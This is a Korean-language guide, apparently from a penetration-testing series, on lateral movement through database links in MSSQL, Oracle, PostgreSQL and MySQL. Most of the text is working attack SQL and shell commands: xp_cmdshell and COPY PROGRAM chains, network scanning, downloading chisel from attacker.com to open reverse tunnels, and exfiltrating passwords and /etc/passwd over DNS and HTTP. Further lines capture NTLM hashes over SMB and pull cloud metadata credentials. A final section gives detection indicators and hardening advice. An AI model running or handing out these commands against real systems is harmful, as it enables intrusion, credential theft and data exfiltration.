# Database Link & Lateral Movement

> 데이터베이스를 통한 내부 네트워크 이동 기법
> 버전: 1.0
> 최종 수정: 2025-01-26

---

## 목차

1. [Lateral Movement 개요](#1-lateral-movement-개요)
2. [Database Link 악용](#2-database-link-악용)
3. [네트워크 정찰](#3-네트워크-정찰)
4. [피봇팅 기법](#4-피봇팅-기법)
5. [클라우드 환경 이동](#5-클라우드-환경-이동)
6. [탐지 및 방어](#6-탐지-및-방어)

---

## 1. Lateral Movement 개요

### 1.1 DB를 통한 내부 이동 개념

```
┌─────────────────────────────────────────────────────────────┐
│              Database를 통한 Lateral Movement                │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌─────────┐                                                │
│  │ 공격자  │                                                │
│  └────┬────┘                                                │
│       │ SQLi                                                 │
│       ▼                                                      │
│  ┌─────────┐    DB Link    ┌─────────┐    ┌─────────┐      │
│  │ Web DB  │ ──────────→   │ 내부 DB │ ─→ │ 관리 DB │      │
│  └────┬────┘               └────┬────┘    └────┬────┘      │
│       │                         │              │            │
│       │ xp_cmdshell            │ OS 명령      │            │
│       ▼                         ▼              ▼            │
│  ┌─────────┐             ┌─────────┐    ┌─────────┐        │
│  │ Web     │             │ 내부    │    │ 도메인  │        │
│  │ Server  │             │ Server  │    │ 컨트롤러│        │
│  └─────────┘             └─────────┘    └─────────┘        │
│                                                              │
│  공격 체인:                                                  │
│  SQLi → DB권한 → DB Link → 내부DB → OS명령 → 도메인장악    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 전제 조건

```yaml
prerequisites:
  # 공격자 요구사항
  attacker_requirements:
    - "SQLi 취약점 (In-band 또는 Stacked Queries)"
    - "적절한 DB 권한 (DBA 또는 특정 권한)"
    - "DB Link 또는 네트워크 기능 접근 권한"

  # 환경 요구사항
  environment:
    - "DB 서버의 아웃바운드 네트워크 허용"
    - "Linked Server 또는 DB Link 설정 존재"
    - "내부 네트워크 접근 가능한 위치"

  # DBMS별 필요 권한
  permissions:
    mssql: "sysadmin 또는 Linked Server 접근 권한"
    oracle: "CREATE DATABASE LINK 권한"
    postgresql: "dblink 확장 사용 권한"
    mysql: "FEDERATED 엔진 또는 ProxySQL 접근"
```

---

## 2. Database Link 악용

### 2.1 MSSQL Linked Server

```sql
-- Linked Server 목록 조회
SELECT * FROM sys.servers;
SELECT * FROM master..sysservers;
EXEC sp_linkedservers;

-- Linked Server 상세 정보
SELECT * FROM sys.linked_logins;
SELECT name, product, provider, data_source FROM sys.servers WHERE is_linked = 1;

-- Linked Server를 통한 쿼리 실행
SELECT * FROM OPENQUERY(LinkedServerName, 'SELECT * FROM users');
SELECT * FROM LinkedServerName.database.schema.table;

-- Linked Server를 통한 명령 실행
EXEC ('xp_cmdshell ''whoami''') AT LinkedServerName;

-- 4중 이름 표기법
SELECT * FROM LinkedServer.catalog.schema.table;

-- Linked Server 생성 (DBA 권한)
EXEC sp_addlinkedserver
    @server = 'InternalDB',
    @srvproduct = '',
    @provider = 'SQLNCLI',
    @datasrc = '192.168.1.100';

EXEC sp_addlinkedsrvlogin
    @rmtsrvname = 'InternalDB',
    @useself = 'False',
    @locallogin = NULL,
    @rmtuser = 'sa',
    @rmtpassword = 'password123';
```

**Linked Server 체인 공격:**
```sql
-- 서버 A → 서버 B → 서버 C 체인
-- 서버 A에서 실행
EXEC ('
    EXEC (''
        SELECT * FROM sensitive_data
    '') AT ServerC
') AT ServerB;

-- xp_cmdshell 체인
EXEC ('
    EXEC (''
        xp_cmdshell "whoami"
    '') AT ServerC
') AT ServerB;
```

### 2.2 Oracle Database Link

```sql
-- Database Link 목록 조회
SELECT * FROM all_db_links;
SELECT * FROM dba_db_links;
SELECT * FROM user_db_links;

-- Database Link를 통한 쿼리
SELECT * FROM users@REMOTE_DB;
SELECT * FROM table_name@db_link_name;

-- Database Link 생성
CREATE DATABASE LINK remote_link
CONNECT TO remote_user IDENTIFIED BY password
USING '(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=192.168.1.100)(PORT=1521))(CONNECT_DATA=(SID=ORCL)))';

-- 또는 TNS 이름 사용
CREATE DATABASE LINK remote_link
CONNECT TO remote_user IDENTIFIED BY password
USING 'REMOTE_TNS';

-- Database Link를 통한 PL/SQL 실행
BEGIN
    EXECUTE IMMEDIATE 'SELECT * FROM users@remote_link' INTO result;
END;

-- 원격 프로시저 호출
EXEC remote_procedure@remote_link;
```

### 2.3 PostgreSQL dblink

```sql
-- dblink 확장 활성화
CREATE EXTENSION dblink;

-- 연결 테스트
SELECT dblink_connect('host=192.168.1.100 dbname=targetdb user=postgres password=pass');

-- 원격 쿼리 실행
SELECT * FROM dblink('host=192.168.1.100 dbname=targetdb user=postgres password=pass',
    'SELECT username, password FROM users')
    AS t(username text, password text);

-- 영구 연결 생성
SELECT dblink_connect('myconn', 'host=internal-db dbname=secrets user=admin password=pass');
SELECT * FROM dblink('myconn', 'SELECT * FROM credentials') AS t(id int, data text);
SELECT dblink_disconnect('myconn');

-- Foreign Data Wrapper (더 현대적인 방법)
CREATE EXTENSION postgres_fdw;

CREATE SERVER foreign_server
    FOREIGN DATA WRAPPER postgres_fdw
    OPTIONS (host '192.168.1.100', port '5432', dbname 'targetdb');

CREATE USER MAPPING FOR current_user
    SERVER foreign_server
    OPTIONS (user 'admin', password 'password');

CREATE FOREIGN TABLE foreign_users (
    id INTEGER,
    username TEXT,
    password TEXT
) SERVER foreign_server
OPTIONS (schema_name 'public', table_name 'users');

SELECT * FROM foreign_users;
```

### 2.4 MySQL Federated Table

```sql
-- FEDERATED 엔진 활성화 확인
SHOW ENGINES;

-- Federated 테이블 생성
CREATE TABLE federated_users (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100)
)
ENGINE=FEDERATED
CONNECTION='mysql://user:pass@192.168.1.100:3306/targetdb/users';

-- 쿼리 실행
SELECT * FROM federated_users;

-- MySQL Router/ProxySQL 악용
-- ProxySQL 관리 인터페이스 접근 (포트 6032)
-- 라우팅 규칙 조작 가능
```

---

## 3. 네트워크 정찰

### 3.1 MSSQL 네트워크 스캔

```sql
-- xp_cmdshell을 통한 네트워크 정찰
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'arp -a';
EXEC xp_cmdshell 'netstat -an';
EXEC xp_cmdshell 'net view /domain';
EXEC xp_cmdshell 'nltest /domain_trusts';

-- DNS 조회
EXEC xp_cmdshell 'nslookup internal-server.domain.local';

-- 포트 스캔 (PowerShell)
EXEC xp_cmdshell 'powershell -c "Test-NetConnection -ComputerName 192.168.1.100 -Port 1433"';

-- OPENROWSET을 통한 서버 탐색
SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=192.168.1.100;UID=sa;PWD=test;', 'SELECT 1');
-- 에러 메시지로 서버 존재 여부 확인

-- xp_dirtree를 통한 SMB 스캔
EXEC xp_dirtree '\\192.168.1.100\c$';
-- 접근 가능 여부로 호스트 탐지
```

### 3.2 Oracle 네트워크 스캔

```sql
-- UTL_TCP를 통한 포트 스캔
DECLARE
    c UTL_TCP.CONNECTION;
BEGIN
    c := UTL_TCP.OPEN_CONNECTION('192.168.1.100', 1521, 2);  -- 2초 타임아웃
    UTL_TCP.CLOSE_CONNECTION(c);
    DBMS_OUTPUT.PUT_LINE('Port OPEN');
EXCEPTION
    WHEN OTHERS THEN
        DBMS_OUTPUT.PUT_LINE('Port CLOSED or filtered');
END;
/

-- UTL_HTTP를 통한 HTTP 스캔
SELECT UTL_HTTP.REQUEST('http://192.168.1.100:80/') FROM dual;

-- UTL_INADDR를 통한 DNS 조회
SELECT UTL_INADDR.GET_HOST_ADDRESS('internal-server.domain.local') FROM dual;
SELECT UTL_INADDR.GET_HOST_NAME('192.168.1.100') FROM dual;

-- DBMS_LDAP를 통한 LDAP 스캔
DECLARE
    retval PLS_INTEGER;
    ldap_host VARCHAR2(256) := '192.168.1.100';
    ldap_port VARCHAR2(256) := '389';
    ldap_session DBMS_LDAP.SESSION;
BEGIN
    ldap_session := DBMS_LDAP.init(ldap_host, ldap_port);
    DBMS_OUTPUT.PUT_LINE('LDAP server found');
END;
/
```

### 3.3 PostgreSQL 네트워크 스캔

```sql
-- dblink를 통한 PostgreSQL 서버 스캔
SELECT dblink_connect('host=192.168.1.100 port=5432 dbname=postgres user=test password=test connect_timeout=2');
-- 에러 메시지로 서버 상태 확인

-- COPY PROGRAM으로 네트워크 도구 실행
COPY (SELECT '') TO PROGRAM 'ping -c 1 192.168.1.100';
COPY (SELECT '') TO PROGRAM 'nc -zv 192.168.1.100 22 2>&1';

-- pg_read_file로 네트워크 설정 확인
SELECT pg_read_file('/etc/hosts');
SELECT pg_read_file('/etc/resolv.conf');
```

---

## 4. 피봇팅 기법

### 4.1 SOCKS Proxy via DB

```yaml
socks_pivoting:
  concept: "DB 서버를 SOCKS 프록시로 사용"

  mssql_approach:
    description: "xp_cmdshell로 터널 도구 실행"
    steps:
      - "chisel/plink 등 업로드"
      - "xp_cmdshell로 실행"
      - "리버스 터널 수립"
    example: |
      EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/chisel.exe C:\chisel.exe';
      EXEC xp_cmdshell 'C:\chisel.exe client attacker.com:8080 R:socks';

  postgresql_approach:
    description: "COPY PROGRAM으로 터널 도구 실행"
    steps:
      - "curl로 도구 다운로드"
      - "실행 권한 부여"
      - "백그라운드 실행"
    example: |
      COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/chisel -o /tmp/chisel';
      COPY (SELECT '') TO PROGRAM 'chmod +x /tmp/chisel && /tmp/chisel client attacker.com:8080 R:socks &';
```

### 4.2 DNS 터널링

```sql
-- MSSQL: DNS 터널링으로 데이터 추출
DECLARE @data VARCHAR(255);
SELECT @data = password FROM users WHERE id = 1;
EXEC master..xp_dirtree '\\' + @data + '.data.attacker.com\x';

-- Oracle: UTL_INADDR로 DNS 터널링
SELECT UTL_INADDR.GET_HOST_ADDRESS(
    (SELECT password FROM users WHERE ROWNUM=1) || '.attacker.com'
) FROM dual;

-- PostgreSQL: COPY PROGRAM으로 DNS 요청
COPY (SELECT '') TO PROGRAM 'host $(cat /etc/passwd | base64 | head -c63).attacker.com';
```

### 4.3 HTTP 터널링

```sql
-- Oracle: UTL_HTTP로 데이터 전송
SELECT UTL_HTTP.REQUEST(
    'http://attacker.com/exfil?data=' ||
    UTL_URL.ESCAPE((SELECT password FROM users WHERE ROWNUM=1))
) FROM dual;

-- MSSQL: PowerShell로 HTTP 요청
EXEC xp_cmdshell 'powershell -c "(New-Object Net.WebClient).DownloadString(''http://attacker.com/beacon'')"';
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/data -Method POST -Body (Get-Content C:\data.txt)"';

-- PostgreSQL: curl로 HTTP 요청
COPY (SELECT '') TO PROGRAM 'curl -X POST -d "data=$(cat /etc/passwd)" http://attacker.com/exfil';
```

### 4.4 SMB Relay 공격

```sql
-- MSSQL: SMB 인증 캡처 유도
EXEC xp_dirtree '\\attacker.com\share';
EXEC xp_fileexist '\\attacker.com\share\file';
EXEC xp_subdirs '\\attacker.com\share';

-- Responder/ntlmrelayx로 NTLM 해시 캡처
-- 또는 다른 서버로 릴레이

-- Oracle: SMB 접근 시도
SELECT * FROM TABLE(
    fn_xe_file_target_read_file('\\attacker.com\share\*.xel', null, null, null)
);
```

---

## 5. 클라우드 환경 이동

### 5.1 AWS 환경

```sql
-- EC2 메타데이터 접근 (SSRF 또는 OS 명령)
-- MSSQL
EXEC xp_cmdshell 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/';

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name';

-- RDS 스냅샷 접근 (권한 있는 경우)
-- AWS CLI로 스냅샷 공유 후 다른 계정에서 복원

-- Secrets Manager 접근
EXEC xp_cmdshell 'aws secretsmanager get-secret-value --secret-id db/prod/password';
```

### 5.2 Azure 환경

```sql
-- Azure Instance Metadata
EXEC xp_cmdshell 'curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"';

-- Managed Identity 토큰 획득
EXEC xp_cmdshell 'curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"';

-- Azure Key Vault 접근
EXEC xp_cmdshell 'curl -H "Authorization: Bearer TOKEN" "https://myvault.vault.azure.net/secrets/mySecret?api-version=7.0"';
```

### 5.3 GCP 환경

```sql
-- GCP 메타데이터
EXEC xp_cmdshell 'curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"';

-- Service Account 토큰
COPY (SELECT '') TO PROGRAM 'curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token';

-- Cloud SQL 다른 인스턴스 접근
-- Private IP를 통한 접근 가능
```

---

## 6. 탐지 및 방어

### 6.1 이상 징후 탐지

```yaml
detection_indicators:
  # DB Link 관련
  db_link_anomalies:
    - "새로운 DB Link 생성"
    - "비정상적인 시간대의 Link 사용"
    - "대량 데이터 전송 via Link"
    - "알 수 없는 원격 서버 접근"

  # 네트워크 정찰
  network_recon:
    - "xp_cmdshell에서 ipconfig/netstat 실행"
    - "다수의 포트/호스트 연결 시도"
    - "DNS 대량 조회"
    - "SMB 연결 시도 (xp_dirtree)"

  # 피봇팅 징후
  pivoting:
    - "비정상적인 아웃바운드 연결"
    - "터널링 도구 프로세스"
    - "메타데이터 서비스 접근 (169.254.169.254)"
    - "대용량 DNS 트래픽"

  # 권한 상승
  privilege_escalation:
    - "DB Link 자격증명 변경"
    - "새 관리자 계정 생성"
    - "권한 부여 명령"
```

### 6.2 방어 전략

```yaml
defense_strategies:
  # DB Link 보안
  db_link_security:
    - action: "불필요한 DB Link 제거"
      command: "DROP DATABASE LINK link_name;"

    - action: "Link 생성 권한 제한"
      mssql: "REVOKE CONTROL ON LINKED_SERVER FROM user"
      oracle: "REVOKE CREATE DATABASE LINK FROM user"

    - action: "Link 사용 모니터링"
      description: "감사 로그 활성화"

  # 네트워크 격리
  network_isolation:
    - "DB 서버 아웃바운드 제한"
    - "Linked Server 전용 네트워크 세그먼트"
    - "Firewall 규칙 최소 권한"
    - "클라우드 보안 그룹 적용"

  # 자격증명 관리
  credential_management:
    - "Linked Server 전용 서비스 계정 사용"
    - "최소 권한 원칙 적용"
    - "정기적인 자격증명 순환"
    - "암호화된 연결 사용"

  # 모니터링
  monitoring:
    - "DB Link 사용 로깅"
    - "이상 쿼리 패턴 탐지"
    - "네트워크 트래픽 분석"
    - "SIEM 연동"
```

### 6.3 DBMS별 보안 설정

```yaml
mssql_hardening:
  - "EXEC sp_dropserver 'UnusedLinkedServer';"
  - "EXEC sp_configure 'remote access', 0; RECONFIGURE;"
  - "EXEC sp_configure 'remote proc trans', 0; RECONFIGURE;"
  - "Linked Server 접근 권한 최소화"
  - "SQL Server Audit 활성화"

oracle_hardening:
  - "DROP DATABASE LINK unused_link;"
  - "REVOKE CREATE DATABASE LINK FROM PUBLIC;"
  - "UTL_TCP, UTL_HTTP, UTL_SMTP ACL 제한"
  - "Database Vault 사용"
  - "Unified Auditing 활성화"

postgresql_hardening:
  - "DROP EXTENSION dblink;"
  - "DROP EXTENSION postgres_fdw;"
  - "pg_hba.conf에서 접근 제한"
  - "log_connections = on"
  - "log_disconnections = on"
```

---

## GR Framework 매핑

```yaml
lateral_movement_gr_mapping:
  attack_phase:
    layer: "L3-L2"  # Network → Internal
    zone: "Zone5 → Zone6+"

  attack_vectors:
    db_link:
      tags: ["D-DB-LINK", "N-INT-*"]
      risk: "HIGH"

    network_recon:
      tags: ["N-SCAN-*", "S-VUL-INFO"]
      risk: "MEDIUM"

    pivoting:
      tags: ["N-TUNNEL-*", "S-VUL-LATERAL"]
      risk: "CRITICAL"

  mitre_attack:
    - "T1021: Remote Services"
    - "T1046: Network Service Scanning"
    - "T1570: Lateral Tool Transfer"
    - "T1572: Protocol Tunneling"

  cwe:
    - "CWE-918: Server-Side Request Forgery"
    - "CWE-441: Unintended Proxy or Intermediary"
```

---

> **이전 문서**: 07_Advanced_Exploitation.md
> **관련 문서**: 01_SQLi_Complete_Guide.md, 02_Bypass_Techniques.md
